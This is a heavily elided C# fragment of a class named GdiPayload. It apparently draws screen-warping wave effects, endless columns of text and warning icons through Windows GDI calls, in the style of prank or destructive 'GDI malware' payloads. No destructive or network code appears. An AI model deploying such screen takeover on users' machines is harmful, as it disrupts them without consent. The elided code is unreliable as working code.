    ...
    public class GdiPayload
    {
                ...
                unsafe
                {
                    ...
                    for (int x = 0; x < w; x++)
                    {
                        for (int y = 0; y < h; y++)
                        {
                            ...
                            {
                                int index = y * w + x;
                                double wave = Math.Sin(distance / 60.0);
                                byte intensity = (byte)((122 * distance - radius) * 255);
        ...
        public static void Carga5()
        {
            ...
            try
            {
                ...
                oldBmp = SelectObject(dcCopy, bmp);
                    ...
                    unsafe
                    {
                        ...
                        for (int x = 0; x < w; x++)
                        {
                            for (int y = 0; y < h; y++)
                            {
                                ...
                                double waveX = Math.Sin((x + time) * 0.05 - mouseX * 0.01) * Math.PI * 2;
                                double waveY = Math.Cos((y + time) * 0.05 - mouseY * 0.01) * Math.PI * 2;
            ...
            while (true)
            {
                ...
                for (int i = 0; i < columns; i++)
                {
                    ...
                    var hFont = CreateFont(fontSize, 0, 0, 0, 700, false, false, false, CharacterSet.DEFAULT_CHARSET,
                                                 ...
                                                 OutputQuality.DEFAULT_QUALITY, PitchAndFamily.FF_DONTCARE, "Ravie");
        ...
        public static void SpawnIcoWarn()
        {
            ...
            HICON hIcon = LoadIcon(HINSTANCE.NULL, IDI_WARNING);
